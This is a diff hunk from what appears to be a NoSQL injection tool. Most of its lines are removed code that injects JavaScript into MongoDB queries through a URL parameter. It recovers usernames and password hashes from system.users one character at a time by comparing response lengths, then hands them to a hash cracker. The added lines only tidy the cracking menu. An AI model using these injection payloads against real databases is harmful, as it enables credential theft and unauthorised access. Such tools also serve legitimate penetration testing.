-                        hashUri, None, requestHeaders
-                    )
-                    lenUri = int(len(getResponseBodyHandlingErrors(req)))
-
-                    if lenUri == baseLen:
-                        pwdHash = pwdHash + chars[charCounterHash]
-                        rightCharsHash += 1
-                        charCounterHash = 0
-
-                    else:
-                        charCounterHash += 1
-
-                hashes.append(pwdHash)
-                print("Got user:hash " + users[0] + ":" + hashes[0])
-                # reinitialize all variables and get ready to do it again
-                charCounterHash = 0
-                rightCharsHash = 0
-                pwdHash = ""
-            else:
-                while charCountUsr == False:
-                    # different query to get the first user vs. others
-                    usrUri = uriArray[16].replace(
-                        "---",
-                        "var usr = db.system.users.findOne({user:{$nin:"
-                        + str(users)
-                        + "}}); if (usr.user.length == "
-                        + str(usrChars)
-                        + ") { return true; } var dum='a"
-                        + "&",
-                    )
-
-                    req = urllib.request.Request(usrUri, None, requestHeaders)
-                    lenUri = int(len(getResponseBodyHandlingErrors(req)))
-
-                    if lenUri == baseLen:
-                        # Got the right number of characters
-                        charCountUsr = True
-
-                    else:
-                        usrChars += 1
-
-                while rightCharsUsr < usrChars:
-                    usrUri = uriArray[16].replace(
-                        "---",
-                        "var usr = db.system.users.findOne({user:{$nin:"
-                        + str(users)
-                        + "}}); if (usr.user.charAt("
-                        + str(rightCharsUsr)
-                        + ") == '"
-                        + chars[charCounterUsr]
-                        + "') { return true; } var dum='a"
-                        + "&",
-                    )
-
-                    req = urllib.request.Request(usrUri, None, requestHeaders)
-                    lenUri = int(len(getResponseBodyHandlingErrors(req)))
-
-                    if lenUri == baseLen:
-                        username = username + chars[charCounterUsr]
-                        rightCharsUsr += 1
-                        charCounterUsr = 0
-
-                    else:
-                        charCounterUsr += 1
-
-                retrUsers += 1
-                # reinitialize all variables and get ready to do it again
-
-                charCountUsr = False
-                rightCharsUsr = 0
-                usrChars = 0
-
-                while rightCharsHash < 32:  # Hash length is static
-                    hashUri = uriArray[16].replace(
-                        "---",
-                        "var usr = db.system.users.findOne({user:{$nin:"
-                        + str(users)
-                        + "}}); if (usr.pwd.charAt("
-                        + str(rightCharsHash)
-                        + ") == '"
-                        + chars[charCounterHash]
-                        + "') { return true; } vardum='a"
-                        + "&",
-                    )
-
-                    req = urllib.request.Request(
-                        hashUri, None, requestHeaders
-                    )
-                    lenUri = int(len(getResponseBodyHandlingErrors(req)))
-
-                    if lenUri == baseLen:
-                        pwdHash = pwdHash + chars[charCounterHash]
-                        rightCharsHash += 1
-                        charCounterHash = 0
-
-                    else:
-                        charCounterHash += 1
-
-                users.append(username)
-                hashes.append(pwdHash)
-                print(
-                    "Got user:hash "
-                    + users[retrUsers - 1]
-                    + ":"
-                    + hashes[retrUsers - 1]
-                )
-                # reinitialize all variables and get ready to do it again
-                username = ""
-                charCounterHash = 0
-                rightCharsHash = 0
-                pwdHash = ""
-    crackHash = input("Crack recovered hashes (y/n)?:  ")
-
-    while crackHash.lower() == "y":
-        menuItem = 1
-        for user in users:
-            print(str(menuItem) + "-" + user)
-            menuItem += 1
-
-        userIndex = input("Select user hash to crack: ")
-        mongodb.passCrack(users[int(userIndex) - 1], hashes[int(userIndex) - 1])
-
-        crackHash = input("Crack another hash (y/n)?")
-    input("Press enter to continue...")
+    crack_hash = input("Crack recovered hashes (y/n)?:  ")
+    while crack_hash.lower() == "y":
+        for i, user in enumerate(users, start=1):
+            print(str(i) + "-" + user)
+        user_index = input("Select user hash to crack: ")
+        mongodb.passCrack(users[int(user_index) - 1], hashes[int(user_index) - 1])
+        crack_hash = input("Crack another hash (y/n)?")
     return
